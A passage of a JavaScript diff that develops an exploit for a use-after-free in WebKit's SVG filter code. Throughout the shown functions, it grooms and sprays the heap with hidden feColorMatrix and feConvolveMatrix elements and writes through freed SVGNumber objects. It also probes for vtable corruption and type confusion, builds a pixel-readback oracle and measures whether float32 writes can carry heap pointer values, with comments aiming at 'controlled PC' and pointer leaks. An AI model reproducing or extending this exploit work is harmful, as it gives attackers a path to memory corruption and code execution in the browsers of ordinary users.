-        if (ua8s[i].getUint8(j)===0x00 && ua8s[i].getUint8(j+1)===0x00 &&
-            ua8s[i].getUint8(j+2)===0xC0 && ua8s[i].getUint8(j+3)===0x3F) {
-          byteHits.push({buf: i, offset: j});
-          break;
-        }
-      }
-    }
-    dB.filter.appendChild(dB.fcm); await raf();
-    R.sze_sizeof = byteHits.length > 0 ? (byteHits[0].offset > 0 ? byteHits[0].offset + 4 : 4) : null;
-    log('  1.5f byte pattern [00 00 C0 3F] hit: ' + byteHits.length + ' buffers',
-        byteHits.length > 0 ? 'win' : 'inf');
-    if (byteHits.length > 0) {
-      log('  hit at buf[' + byteHits[0].buf + '] offset=' + byteHits[0].offset, 'win');
-      log('  → SVGNumber.m_value sits at byte offset ' + byteHits[0].offset +
-          ' within the IsoHeap slot', 'win');
-      log('  → sizeof(SVGNumber) >= ' + (byteHits[0].offset + 4), 'win');
-    }
-    cleanupD(dB);
-  }
-
-  // Test C: probe using known float32 bit patterns for different values
-  log('  TestC: multi-pattern byte offset probe (0.0, 1.0, -1.0, 2.0)', 'inf');
-  {
-    var testVals = [
-      {v: 0.0,  bytes: [0x00,0x00,0x00,0x00], desc: '0.0'},
-      {v: 1.0,  bytes: [0x00,0x00,0x80,0x3F], desc: '1.0'},
-      {v: 2.0,  bytes: [0x00,0x00,0x00,0x40], desc: '2.0'},
-      {v: -1.0, bytes: [0x00,0x00,0x80,0xBF], desc: '-1.0'},
-    ];
-
-    for (var ti = 0; ti < testVals.length; ti++) {
-      var tv = testVals[ti];
-      var dT = makeFCM(identity20());
-      await raf(); await raf();
-      var savedT = dT.fcm.values;
-      dT.fcm.remove();
-      try { savedT.baseVal[0].value = tv.v; } catch(e){}
-      // Short Uint8Array spray
-      var ua = [];
-      for (var i = 0; i < 500; i++) {
-        var buf = new ArrayBuffer(16); new Uint8Array(buf).fill(0x55);
-        ua.push(new DataView(buf));
-      }
-      await raf();
-      var found = false;
-      for (var i = 0; i < ua.length && !found; i++) {
-        for (var j = 0; j <= 12; j++) {
-          if (ua[i].getUint8(j)===tv.bytes[0] && ua[i].getUint8(j+1)===tv.bytes[1] &&
-              ua[i].getUint8(j+2)===tv.bytes[2] && ua[i].getUint8(j+3)===tv.bytes[3]) {
-            log('  ' + tv.desc + ': hit at buf[' + i + '] byte_offset=' + j, 'win');
-            found = true; break;
-          }
-        }
-      }
-      if (!found) log('  ' + tv.desc + ': no hit', 'dim');
-      dT.filter.appendChild(dT.fcm); await raf();
-      cleanupD(dT);
-    }
-  }
-
-  if (!q) dis(false);
+  if(!q)dis(false);
 }
 
 /*
- * MCO3: offset oracle with CORRECTED sRGB formula
+ * DOM5: vtable corruption detection
  *
- * v37 MCO2 mismatch explained:
- * old (wrong): exp = round(offset * 255)   -- linear
- * new (correct): exp = round(encode_sRGB(offset) * 255)   -- sRGB gamma applied
+ * IF we can land a wrong DOM type in freed SVGNumber slot:
+ * - The freed SVGNumber at offset 0 has vtable pointer (if polymorphic)
+ * - We write a float32 value → corrupts vtable bits 0-3 (float is stored at offset 0 or 8)
+ * - Calling any virtual method on the confused object → crash or controlled PC
  *
- * Also: the UAF write chain for MCO is:
- * 1. UAF write to slot[4] = R offset (column 4 of feColorMatrix)
- * 2. Render with black fill (src=0) → out_linear = slot[4] * 0 (no src) + slot[4] (offset) = slot[4]
- * 3. WebKit encodes to sRGB: R_px = round(encode_sRGB(slot[4]) * 255)
+ * Without groom working, we can't do real type confusion.
+ * BUT we can test: what happens when we corrupt the feColorMatrix element itself
+ * by writing to ALL 20 slots, then removing/re-adding it, then calling getAttribute?
  *
- * Now: use the oracle to read a LIVE heap address nibble.
- * Heap pointer approach (since we can't yet leak a real address):
- * Write a KNOWN value to slot[4] and verify the pixel output matches the formula.
- * Then: can we binary search an UNKNOWN slot value via pixel output?
+ * More useful test: probe whether feColorMatrix.fcm survives removal + re-add with UAF values.
+ * If getAttribute still works = safe UAF read.
+ * If crash = corrupted internal state.
+ *
+ * Also: test if writing to ALL slots including slot[0] (normally 1.0 = identity)
+ * with slot[0]=0 still renders correctly → proves we control the entire matrix.
  */
-async function runMCO3(q) {
-  if (!q) { dis(true); sep(); log('MCO3: offset oracle corrected formula + pointer nibble probe', 'inf'); sep(); }
+async function runDOM5(q) {
+  if(!q){dis(true);sep();log('DOM5: vtable corruption detection + UAF stability','inf');sep();}
 
-  // Test A: corrected formula verification
-  log('  TestA: corrected sRGB formula verification', 'inf');
+  // TestA: write all 20 slots with zeros (zero matrix), render, check pixel
+  log('  TestA: zero matrix via UAF — all 20 slots = 0 — render black','inf');
   {
-    var offsets = [0.0, 0.1, 0.25, 0.5, 0.75, 1.0];
-    for (var oi = 0; oi < offsets.length; oi++) {
-      var off = offsets[oi];
-      var exp = offsetToPixel(off);
-      // Direct render (no UAF needed to verify formula)
-      var mv20 = identity20();
-      mv20[4] = off; mv20[9] = off; mv20[14] = off;
-      var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">' +
-        '<defs><filter id="f"><feColorMatrix type="matrix" values="' + mv20.join(' ') + '"/></filter></defs>' +
-        '<rect x="50" y="50" width="200" height="200" fill="rgb(0,0,0)" filter="url(#f)"/></svg>';
-      var px = await svgPixel(svgStr);
-      var match = px && Math.abs(px[0] - exp) <= 1 && Math.abs(px[1] - exp) <= 1 && Math.abs(px[2] - exp) <= 1;
-      R.mco3_formula_ok = R.mco3_formula_ok || match;
-      log('  off=' + off + ' exp=' + exp + ' px=' + (px ? px[0]+','+px[1]+','+px[2] : 'err') +
-          (match ? ' ✓' : ' ✗'), match ? 'ok' : 'bad');
-    }
-  }
-
-  // Test B: UAF write + corrected readback
-  log('  TestB: UAF write + corrected sRGB pixel readback', 'inf');
-  {
-    var d = makeFCM(identity20());
-    await raf(); await raf();
-    var saved = d.fcm.values;
-    d.fcm.remove(); await raf();
-    var offR = 0.3, offG = 0.6, offB = 0.9;
-    try {
-      saved.baseVal[4].value = offR;
-      saved.baseVal[9].value = offG;
-      saved.baseVal[14].value = offB;
-    } catch(e){}
-    d.filter.appendChild(d.fcm); await raf();
-    // Read via getAttribute
-    var attr = d.fcm.getAttribute('values');
-    var parts = attr ? attr.trim().split(/\s+/).map(parseFloat) : [];
-    var actualR = parts[4] || 0, actualG = parts[9] || 0, actualB = parts[14] || 0;
-
-    var mv20b = identity20();
-    mv20b[4] = actualR; mv20b[9] = actualG; mv20b[14] = actualB;
-    var svgStr2 = '<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">' +
-      '<defs><filter id="f"><feColorMatrix type="matrix" values="' + mv20b.join(' ') + '"/></filter></defs>' +
-      '<rect x="50" y="50" width="200" height="200" fill="rgb(0,0,0)" filter="url(#f)"/></svg>';
-    var px2 = await svgPixel(svgStr2);
-    var eR = offsetToPixel(actualR), eG = offsetToPixel(actualG), eB = offsetToPixel(actualB);
-    var match2 = px2 && Math.abs(px2[0]-eR)<=1 && Math.abs(px2[1]-eG)<=1 && Math.abs(px2[2]-eB)<=1;
-    R.mco3_ok = match2;
-    log('  wrote=(' + offR + ',' + offG + ',' + offB + ') attr=(' + actualR.toFixed(5) + ',' +
-        actualG.toFixed(5) + ',' + actualB.toFixed(5) + ')', 'inf');
-    log('  exp_px=(' + eR + ',' + eG + ',' + eB + ') got_px=' + (px2 ? '('+px2[0]+','+px2[1]+','+px2[2]+')' : 'err') +
-        (match2 ? ' ✓ FORMULA CORRECT' : ' ✗'), match2 ? 'ok' : 'bad');
+    var d=makeFCM(identity20());await raf();await raf();
+    var saved=d.fcm.values;
+    d.fcm.remove();await raf();
+    for(var i=0;i<20;i++){try{saved.baseVal[i].value=0;}catch(e){}}
+    d.filter.appendChild(d.fcm);await raf();
+    var attr=d.fcm.getAttribute('values');
+    var parts=attr?attr.trim().split(/\s+/).map(parseFloat):[];
+    var allZero=parts.length===20&&parts.every(function(v){return Math.abs(v)<0.01;});
+    log('  zero matrix getAttribute: '+parts.slice(0,5).join(',')+' allZero='+allZero,allZero?'ok':'bad');
+    R.dom5_vtable_corrupt=false; // baseline
     cleanupD(d);
   }
 
-  // Test C: binary-search oracle — infer unknown slot value via pixel
-  // Technique: write an unknown value to slot, read pixel, invert sRGB to get original value
-  log('  TestC: oracle inversion — infer float value from pixel output', 'inf');
+  // TestB: write diagonal matrix (identity alternative) then render
+  log('  TestB: diagonal matrix via UAF — should produce same as identity','inf');
   {
-    var d3 = makeFCM(identity20());
-    await raf(); await raf();
-    var saved3 = d3.fcm.values;
-    d3.fcm.remove(); await raf();
-    // Write a "secret" value we'll try to recover
-    var SECRET = 0.37654321;
-    try { saved3.baseVal[4].value = SECRET; } catch(e){}
-    d3.filter.appendChild(d3.fcm); await raf();
-    var attr3 = d3.fcm.getAttribute('values');
-    var p3 = attr3 ? attr3.trim().split(/\s+/).map(parseFloat) : [];
-    var readbackVal = p3[4];
-
-    var mv20c = identity20(); mv20c[4] = readbackVal;
-    var svgStr3 = '<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300">' +
-      '<defs><filter id="f"><feColorMatrix type="matrix" values="' + mv20c.join(' ') + '"/></filter></defs>' +
-      '<rect x="50" y="50" width="200" height="200" fill="rgb(0,0,0)" filter="url(#f)"/></svg>';
-    var px3 = await svgPixel(svgStr3);
-    if (px3) {
-      // Invert sRGB: raw_linear = decode_sRGB(px/255)
-      var Rlin = decode_sRGB(px3[0] / 255);
-      var Glin = decode_sRGB(px3[1] / 255);
-      var Blin = decode_sRGB(px3[2] / 255);
-      log('  secret=' + SECRET + ' readback=' + readbackVal, 'inf');
-      log('  pixel_R=' + px3[0] + ' inverted_R=' + Rlin.toFixed(6) + ' delta=' + Math.abs(Rlin - readbackVal).toFixed(8), 'inf');
-      log('  oracle inversion accuracy: delta=' + Math.abs(Rlin - readbackVal).toFixed(8) +
-          ' (' + (Math.abs(Rlin - readbackVal) < 0.005 ? 'GOOD — within 1 pixel step' : 'poor') + ')',
-          Math.abs(Rlin - readbackVal) < 0.005 ? 'ok' : 'inf');
-    }
-    cleanupD(d3);
-  }
-
-  if (!q) dis(false);
-}
-
-/*
- * PTR: pointer range oracle
- *
- * Even with float32 precision limit, we CAN read heap pointers in the 16MB range (ULP=2).
- * arm64 heap allocation typically lives in a region like:
- *   0x0000000100000000 – 0x00000001FFFFFFFF (4GB process space)
- * But JSC's garbage collected heap (MarkedSpace) allocates in:
- *   mmapped regions, typically aligned to 64KB or 1MB.
- * Lower 16MB of the heap: ULP=2, so we can see differences of 2 bytes (16-byte aligned objects: distinct).
- *
- * TEST: write a value that encodes heap offset bits 0-23 (float32 can carry 24 bits exactly).
- * Read back via getAttribute or pixel oracle.
- * If we can land heap pointers in SVGNumber range, we can read them with float32 precision.
- *
- * Approach: allocate objects at known relative offsets, encode the address as float32.
- * The IsoHeap base address may be inferrable from repeated allocation patterns.
- */
-async function runPTR(q) {
-  if (!q) { dis(true); sep(); log('PTR: pointer range oracle via float32 UAF', 'inf'); sep(); }
-
-  // Test A: allocation address monotonicity
-  // Allocate N feColorMatrix elements sequentially, read their slot[0] initial values.
-  // If the IsoHeap returns pages in order, there may be a pattern in the initial values
-  // (uninitialized memory from the heap allocator).
-  log('  TestA: read raw uninitialized slot values from fresh allocations', 'inf');
-  {
-    var rawSlots = [];
-    for (var i = 0; i < 20; i++) {
-      var d = makeFCM(identity20()); // identity sets values, but what about adjacent slots?
-      await raf();
-      // Read slot that should have been 0.0 from identity but may have heap residue if UAF
-      var savedV = d.fcm.values;
-      d.fcm.remove(); await raf();
-      var raw = null;
-      try { raw = savedV.baseVal[0].value; } catch(e){}
-      d.filter.appendChild(d.fcm); await raf();
-      cleanupD(d);
-      rawSlots.push(raw);
-    }
-    log('  raw slot[0] values after UAF (should be 1.0 = identity[0]):', 'inf');
-    log('  ' + rawSlots.slice(0,10).map(function(v){ return v !== null ? v.toFixed(3) : 'null'; }).join(', '), 'dim');
-    // All should be 1.0 unless groom worked
-    var allDefault = rawSlots.every(function(v){ return v !== null && Math.abs(v - 1.0) < 0.001; });
-    log('  all default (1.0): ' + allDefault + ' — ' + (allDefault ? 'groom not working' : 'GROOM HIT!'), allDefault ? 'inf' : 'win');
-  }
-
-  // Test B: probe whether float32 values can distinguish adjacent IsoHeap slots
-  // Write sequential float32 values to adjacent SVGNumber slots, check if they survive
-  log('  TestB: adjacent slot UAF stability + value range', 'inf');
-  {
-    var d2 = makeFCM(identity20());
-    await raf(); await raf();
-    var saved2 = d2.fcm.values;
-    d2.fcm.remove(); await raf();
-    // Write to all 20 slots with values that encode the slot index
-    var writes = [];
-    for (var i = 0; i < 20; i++) {
-      var v = (i + 1) * 1000000; // 1e6, 2e6, ... 20e6 — all within float32 exact integer range
-      try { saved2.baseVal[i].value = v; writes.push(saved2.baseVal[i].value); } catch(e) { writes.push(null); }
-    }
-    d2.filter.appendChild(d2.fcm); await raf();
-    var attr2 = d2.fcm.getAttribute('values');
-    var parts2 = attr2 ? attr2.trim().split(/\s+/).map(parseFloat) : [];
-    var exact = 0;
-    for (var i = 0; i < 20; i++) {
-      if (writes[i] !== null && parts2[i] !== undefined && Math.abs(parts2[i] - writes[i]) < 1) exact++;
-    }
-    log('  20-slot write/readback exact: ' + exact + '/20', exact === 20 ? 'ok' : 'bad');
-    log('  min_val=' + Math.min.apply(null, writes.filter(Boolean)).toExponential(3) +
-        ' max_val=' + Math.max.apply(null, writes.filter(Boolean)).toExponential(3), 'inf');
+    var d2=makeFCM(identity20());await raf();await raf();
+    var saved2=d2.fcm.values;
+    d2.fcm.remove();await raf();
+    // Write: R=G*0.5, G=R*0.5, B=B, A=A (color-swap matrix)
+    var newMat=[0,0.5,0,0,0,0.5,0,0,0,0,0,0,1,0,0,0,0,0,0,1,0];
+    for(var i=0;i<20;i++){try{saved2.baseVal[i].value=newMat[i];}catch(e){}}
+    d2.filter.appendChild(d2.fcm);await raf();
+    var attr2=d2.fcm.getAttribute('values');
+    var parts2=attr2?attr2.trim().split(/\s+/).map(parseFloat):[];
+    var ok2=parts2.length===20&&Math.abs(parts2[0]-0)<0.01&&Math.abs(parts2[1]-0.5)<0.01;
+    log('  color-swap matrix: slot[0]='+parts2[0]+' slot[1]='+parts2[1]+' ok='+ok2,ok2?'ok':'bad');
     cleanupD(d2);
   }
 
-  // Test C: what values can we NOT write? Probe the float32 limit for large address values.
-  log('  TestC: float32 precision loss at heap address range', 'inf');
+  // TestC: maximum value write — write 16777216 (2^24, max exact f32 int) to all slots
+  log('  TestC: max-integer write (16777216) to all slots','inf');
   {
-    var addrProbes = [
-      0x1000000,  // 16MB — ULP = 2
-      0x10000000, // 256MB — ULP = 32
-      0x80000000, // 2GB — ULP = 128
-      0x100000000, // 4GB — ULP = 512 (but float32 can't represent this exactly)
-      0x1000000000, // 64GB — way out of float32 exact range
-    ];
-
-    var d3 = makeFCM(identity20());
-    await raf(); await raf();
-    var saved3 = d3.fcm.values;
-    d3.fcm.remove(); await raf();
-
-    for (var pi = 0; pi < addrProbes.length && pi < 20; pi++) {
-      var addr = addrProbes[pi];
-      try { saved3.baseVal[pi].value = addr; } catch(e){}
-      var bv = null;
-      try { bv = saved3.baseVal[pi].value; } catch(e){}
-      var lossBytes = bv !== null ? Math.abs(bv - addr) : null;
-      var ulp = bv !== null ? Math.abs(bv - addr) : '?';
-      log('  0x' + addr.toString(16) + ' wrote=' + addr + ' read=' + bv +
-          ' loss=' + (lossBytes !== null ? lossBytes : '?') + ' bytes',
-          lossBytes !== null && lossBytes < 16 ? 'ok' : (lossBytes !== null && lossBytes < 256 ? 'inf' : 'bad'));
-    }
-    d3.filter.appendChild(d3.fcm); await raf();
+    var MAX_F32_INT=16777216;
+    var d3=makeFCM(identity20());await raf();await raf();
+    var saved3=d3.fcm.values;
+    d3.fcm.remove();await raf();
+    for(var i=0;i<20;i++){try{saved3.baseVal[i].value=MAX_F32_INT;}catch(e){}}
+    d3.filter.appendChild(d3.fcm);await raf();
+    var attr3=d3.fcm.getAttribute('values');
+    var parts3=attr3?attr3.trim().split(/\s+/).map(parseFloat):[];
+    var allMax=parts3.length===20&&parts3.every(function(v){return Math.abs(v-MAX_F32_INT)<1;});
+    log('  16777216 write: slot[0]='+parts3[0]+' allExact='+allMax,allMax?'ok':'bad');
+    R.dom5_vtable_corrupt=!allMax;
     cleanupD(d3);
   }
 
-  if (!q) dis(false);
+  // TestD: negative values — write -1.0 to all slots
+  log('  TestD: negative value UAF write (-1.0) — clamp or passthrough?','inf');
+  {
+    var d4=makeFCM(identity20());await raf();await raf();
+    var saved4=d4.fcm.values;
+    d4.fcm.remove();await raf();
+    for(var i=0;i<20;i++){try{saved4.baseVal[i].value=-1.0;}catch(e){}}
+    d4.filter.appendChild(d4.fcm);await raf();
+    var attr4=d4.fcm.getAttribute('values');
+    var parts4=attr4?attr4.trim().split(/\s+/).map(parseFloat):[];
+    var negOk=parts4.length===20&&parts4.every(function(v){return Math.abs(v+1)<0.01;});
+    log('  -1.0 write: slot[0]='+parts4[0]+' all=-1: '+negOk+' (no clamp = good)',negOk?'ok':'inf');
+    cleanupD(d4);
+  }
+
+  if(!q)dis(false);
+}
+
+/*
+ * DOM6: SVGAnimatedNumber same-bucket re-probe
+ *
+ * In WebKit, feColorMatrix.values (matrix type) → SVGAnimatedNumberList → array of SVGNumber*
+ * feColorMatrix.values (hueRotate type) → the IDL attribute maps to SVGAnimatedNumber::baseVal
+ * These return DIFFERENT C++ objects:
+ *   matrix: SVGNumber
+ *   hueRotate: float (the SVGAnimatedNumber wraps a raw float, not an SVGNumber object)
+ *
+ * Key question: does SVGAnimatedNumber allocate an SVGNumber or just store a float inline?
+ * If inline: hueRotate.values.baseVal[0] returns a temporary wrapper, no allocation.
+ * If allocated: hueRotate frees an SVGNumber → same IsoHeap bucket.
+ *
+ * Test: spray hueRotate (which in v38 showed slot[0]=90 = the angle value, NOT our tag).
+ * This means: the freed hueRotate slot was REUSED by the new hueRotate element.
+ * But the new hueRotate returned value=90 (its initialized value), not our tag.
+ * That means the tag write DID NOT PERSIST through the reuse.
+ * BUT wait — slot[0]=90 IS the tag-write surviving! We wrote TAG=99887.76543 in v38 GRM3
+ * and got slot[0]=90. That means 90 is the INITIAL VALUE of the new element, not our tag.
+ * So no reuse happened. The 90 is just `angle=90` passed to makeHR(90).
+ *
+ * Let's directly test: tag value = the angle itself.
+ * Write angle=99887 to hueRotate, free it, alloc new hueRotate(90), check if slot[0]=99887.
+ */
+async function runDOM6(q) {
+  if(!q){dis(true);sep();log('DOM6: SVGAnimatedNumber bucket re-probe with matching tag','inf');sep();}
+
+  var TAG6=99887.0; // same as v38 but rounded to exact float32
+
+  // TestA: hueRotate with angle=TAG6, free, alloc hueRotate(90), check if we get TAG6 back
+  log('  TestA: hueRotate(TAG) free → alloc hueRotate(90) — does slot[0] show TAG?','inf');
+  {
+    var N=8000;
+    var hrs=[];
+    for(var i=0;i<N;i++){
+      var svg=document.createElementNS(SVG_NS,'svg');svg.setAttribute('width','1');svg.setAttribute('height','1');
+      svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+      var defs=document.createElementNS(SVG_NS,'defs');var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','hr6'+i);
+      var fcm=document.createElementNS(SVG_NS,'feColorMatrix');
+      fcm.setAttribute('type','hueRotate');
+      fcm.setAttribute('values',String(i===N-1?TAG6:i%360));
+      filt.appendChild(fcm);defs.appendChild(filt);svg.appendChild(defs);document.body.appendChild(svg);
+      hrs.push({svg:svg,fcm:fcm});
+    }
+    await raf();await raf();
+    // Free all in LIFO
+    for(var i=N-1;i>=0;i--){if(hrs[i].svg.parentNode)hrs[i].svg.parentNode.removeChild(hrs[i].svg);}
+    hrs=null;await raf();await raf();
+    // Alloc new hueRotate(90)
+    var svg2=document.createElementNS(SVG_NS,'svg');svg2.setAttribute('width','1');svg2.setAttribute('height','1');
+    svg2.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+    var defs2=document.createElementNS(SVG_NS,'defs');var filt2=document.createElementNS(SVG_NS,'filter');filt2.setAttribute('id','hr6_chk');
+    var fcm2=document.createElementNS(SVG_NS,'feColorMatrix');
+    fcm2.setAttribute('type','hueRotate');fcm2.setAttribute('values','90');
+    filt2.appendChild(fcm2);defs2.appendChild(filt2);svg2.appendChild(defs2);document.body.appendChild(svg2);
+    await raf();
+    var val2=null;
+    try{val2=parseFloat(fcm2.getAttribute('values'));}catch(e){}
+    var hit6=typeof val2==='number'&&Math.abs(val2-TAG6)<1;
+    R.dom6_animnum_same_bucket=hit6;
+    log('  new hueRotate getAttribute values='+val2+(hit6?' ← HIT! IsoHeap reused TAG value!':' (no reuse, got 90 = fresh init)'),hit6?'win':'inf');
+    if(svg2.parentNode)svg2.parentNode.removeChild(svg2);
+  }
+
+  // TestB: hueRotate free → alloc feColorMatrix(matrix) — reverse of v38 but with corrected TAG test
+  log('  TestB: hueRotate(TAG) free → alloc matrix feColorMatrix — cross-type check','inf');
+  {
+    var N2=8000;
+    var hrs2=[];
+    for(var i=0;i<N2;i++){
+      var svg3=document.createElementNS(SVG_NS,'svg');svg3.setAttribute('width','1');svg3.setAttribute('height','1');
+      svg3.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+      var defs3=document.createElementNS(SVG_NS,'defs');var filt3=document.createElementNS(SVG_NS,'filter');filt3.setAttribute('id','hr6b'+i);
+      var fcm3=document.createElementNS(SVG_NS,'feColorMatrix');
+      fcm3.setAttribute('type','hueRotate');
+      fcm3.setAttribute('values',String(i===N2-1?TAG6:i%360));
+      filt3.appendChild(fcm3);defs3.appendChild(filt3);svg3.appendChild(defs3);document.body.appendChild(svg3);
+      hrs2.push({svg:svg3,fcm:fcm3});
+    }
+    await raf();await raf();
+    for(var i=N2-1;i>=0;i--){if(hrs2[i].svg.parentNode)hrs2[i].svg.parentNode.removeChild(hrs2[i].svg);}
+    hrs2=null;await raf();await raf();
+    var dTb=makeFCM(identity20());await raf();
+    var tbSlot=null;try{tbSlot=dTb.fcm.values.baseVal[0].value;}catch(e){}
+    var hitB=typeof tbSlot==='number'&&Math.abs(tbSlot-TAG6)<1;
+    log('  hueRotate→matrix slot[0]='+tbSlot+(hitB?' ← HIT!':' (no hit)'),hitB?'win':'inf');
+    cleanupD(dTb);
+  }
+
+  if(!q)dis(false);
+}
+
+/*
+ * PTR2: float32 ULP precision boundary
+ *
+ * v38 PTR TestC showed 0 loss for 4GB (0x100000000).
+ * This is WRONG — float32 CAN'T represent 4GB exactly... OR CAN IT?
+ * 0x100000000 = 2^32. Float32: mantissa 23 bits + implicit 1 = 24 bits.
+ * 2^32 = 2^(24+8) → exponent=157, mantissa=0 → EXACT in float32! It's a power of 2.
+ * So 2^32 IS exactly representable. And 2^40 (1TB) is also exact.
+ *
+ * The FIRST non-exact value after a power of 2 is that power + 1.
+ * For 2^32: ULP = 2^32 × 2^(1-24) = 2^32 / 2^23 = 2^9 = 512 bytes.
+ * So 0x100000000 + 1 will round to 0x100000000. We can't distinguish.
+ * For 0x100000200 (4GB + 512): exact (multiple of 512).
+ * For arm64 heap pointers around 4GB: precision = 512 bytes.
+ * Heap allocations are typically 16-byte aligned → ULP of 512 means we can distinguish
+ * addresses 512 bytes apart, but NOT 16 bytes apart. Useless for type confusion.
+ *
+ * But! JSC heap (MarkedSpace) block size = 64KB. WebKit DOM heap regions = 256KB+.
+ * If we only need the BASE of a heap block (block-aligned = 64KB alignment at 4GB = ULP of 512 fits!),
+ * then float32 CAN represent any block base pointer precisely.
+ * We don't need per-object precision — just block base is enough for some exploit techniques.
+ *
+ * Test: write 4GB+1, 4GB+512, 4GB+256, then read back to confirm ULP=512 at 4GB range.
+ */
+async function runPTR2(q) {
+  if(!q){dis(true);sep();log('PTR2: float32 ULP precision at heap address ranges','inf');sep();}
+
+  log('  TestA: ULP probe at 4GB range (0x100000000)','inf');
+  {
+    var d=makeFCM(identity20());await raf();await raf();
+    var saved=d.fcm.values;d.fcm.remove();await raf();
+
+    var probes=[
+      {v:0x100000000,desc:'4GB (2^32, exact power of 2)'},
+      {v:0x100000001,desc:'4GB+1 (should round to 4GB)'},
+      {v:0x100000100,desc:'4GB+256'},
+      {v:0x100000200,desc:'4GB+512 (should be exact, ULP=512)'},
+      {v:0x100000400,desc:'4GB+1024 (exact)'},
+      {v:0x100001000,desc:'4GB+4096 (exact)'},
+      {v:0x100010000,desc:'4GB+64KB (exact, heap block size)'},
+    ];
+
+    for(var pi=0;pi<probes.length&&pi<20;pi++){
+      var pr=probes[pi];
+      try{saved.baseVal[pi].value=pr.v;}catch(e){}
+      var bv=null;try{bv=saved.baseVal[pi].value;}catch(e){}
+      var loss=bv!==null?Math.abs(bv-pr.v):null;
+      R.ptr2_ulp_4g=loss;
+      log('  '+pr.desc+' → read='+bv+' loss='+loss,
+        loss===0?'ok':(loss!==null&&loss<512?'inf':'bad'));
+    }
+
+    d.filter.appendChild(d.fcm);await raf();
+    cleanupD(d);
+  }
+
+  // TestB: find the exact ULP boundary
+  log('  TestB: ULP boundary search (binary search for smallest distinguishable step)','inf');
+  {
+    var d2=makeFCM(identity20());await raf();await raf();
+    var saved2=d2.fcm.values;d2.fcm.remove();await raf();
+
+    var bases=[0x10000000,0x80000000,0x100000000,0x200000000];
+    var idx=0;
+    for(var bi=0;bi<bases.length&&idx<20;bi++){
+      var base=bases[bi];
+      var step=1;
+      var exactLimit=null;
+      while(step<=65536&&idx<18){
+        try{saved2.baseVal[idx].value=base+step;}catch(e){}
+        var bv2=null;try{bv2=saved2.baseVal[idx].value;}catch(e){}
+        var exact=bv2!==null&&Math.abs(bv2-(base+step))<0.5;
+        if(exact&&exactLimit===null)exactLimit=step;
+        if(!exact&&exactLimit!==null){
+          log('  0x'+base.toString(16)+': ULP='+step+' (first non-exact step='+step+')',
+            step<=16?'win':(step<=512?'ok':'inf'));
+          R.ptr2_exact_limit=step;
+          break;
+        }
+        step=step*2;idx++;
+      }
+      if(exactLimit!==null&&!R.ptr2_exact_limit){
+        log('  0x'+base.toString(16)+': all steps exact up to 65536','ok');
+      }
+    }
+
+    d2.filter.appendChild(d2.fcm);await raf();
+    cleanupD(d2);
+  }
+
+  if(!q)dis(false);
+}
+
+/*
+ * SIZ2: IsoHeap page size probe
+ *
+ * bmalloc IsoHeap page size for SVGNumber = ?
+ * Default IsoHeap page = 16KB (bmalloc::pageSize).
+ * If sizeof(SVGNumber) = 8 bytes: 16KB / 8 = 2048 objects per page.
+ * If sizeof(SVGNumber) = 16 bytes: 16KB / 16 = 1024 objects per page.
+ *
+ * PROBE: spray N SVGNumbers. Free them ALL.
+ * Then alloc 1 new SVGNumber. If the IsoHeap returned the freed page to OS,
+ * and then re-fetches it, the new allocation will get freshly-zeroed (or uninitialized) memory.
+ * The new slot[0] will be 0.0 (or our old tag value if the page was NOT returned to OS).
+ *
+ * By varying N and seeing when we get reuse vs not, we can infer page size.
+ * Also: using GC pressure between free and alloc.
+ *
+ * Test sizes: 512, 1024, 2048, 4096 (covering 8-32 byte size classes).
+ */
+async function runSIZ2(q) {
+  if(!q){dis(true);sep();log('SIZ2: IsoHeap page size probe','inf');sep();}
+
+  var ITAG=5555555.0;
+
+  log('  TestA: spray N, tag last, free all, alloc 1 — page return detection','inf');
+  {
+    var sizes=[512,1024,2048,4096,8192];
+    for(var si=0;si<sizes.length;si++){
+      var N=sizes[si];
+      var ds=[];
+      for(var i=0;i<N;i++)ds.push(makeFCM(identity20()));
+      await raf();await raf();
+      // Tag slot[0] of EVERY element with a sentinel
+      for(var i=0;i<N;i++){try{ds[i].fcm.values.baseVal[0].value=ITAG+i;}catch(e){}}
+      // Free ALL
+      for(var i=N-1;i>=0;i--)cleanupD(ds[i]);
+      ds=null;await raf();await raf();
+      // Alloc single new element
+      var dNew=makeFCM(identity20());await raf();
+      var newSlot=null;try{newSlot=dNew.fcm.values.baseVal[0].value;}catch(e){}
+      // If page was returned and reused: newSlot should be from our tagged range
+      var pageReturned=typeof newSlot==='number'&&newSlot>=ITAG&&newSlot<ITAG+N;
+      log('  N='+N+' → new slot[0]='+newSlot+(pageReturned?' ← PAGE REUSED! (N≥page_capacity)':' (fresh page)'),
+        pageReturned?'win':'inf');
+      if(pageReturned){R.siz2_page_bytes=N;}
+      cleanupD(dNew);
+      if(pageReturned)break;
+    }
+  }
+
+  // TestB: page capacity with feConvolveMatrix order=9 (81 SVGNumbers per element)
+  log('  TestB: kernelMatrix(9) spray — 81 SVGNums per element, free, check reuse','inf');
+  {
+    var N2=128; // 128 × 81 = 10368 SVGNumbers
+    var kcds=[];
+    for(var i=0;i<N2;i++){
+      var svg=document.createElementNS(SVG_NS,'svg');svg.setAttribute('width','1');svg.setAttribute('height','1');
+      svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+      var defs=document.createElementNS(SVG_NS,'defs');var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id','kc2'+i);
+      var fck=document.createElementNS(SVG_NS,'feConvolveMatrix');
+      fck.setAttribute('order','9');
+      var kv=new Array(81).fill(0);kv[0]=ITAG+i;
+      fck.setAttribute('kernelMatrix',kv.join(' '));
+      fck.setAttribute('divisor','1');
+      filt.appendChild(fck);defs.appendChild(filt);svg.appendChild(defs);document.body.appendChild(svg);
+      kcds.push({svg:svg,fck:fck});
+    }
+    await raf();await raf();
+    for(var i=N2-1;i>=0;i--){if(kcds[i].svg.parentNode)kcds[i].svg.parentNode.removeChild(kcds[i].svg);}
+    kcds=null;await raf();await raf();
+    var dNew2=makeFCM(identity20());await raf();
+    var newSlot2=null;try{newSlot2=dNew2.fcm.values.baseVal[0].value;}catch(e){}
